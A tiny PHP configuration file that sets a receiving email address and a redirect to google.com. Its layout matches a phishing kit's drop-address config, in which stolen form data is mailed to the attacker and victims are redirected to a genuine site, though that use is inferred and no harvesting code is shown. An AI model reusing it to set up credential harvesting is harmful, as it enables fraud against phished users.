<?php 
$Receive_email="montewash33@gmail.com";
$redirect="https://www.google.com/";
?>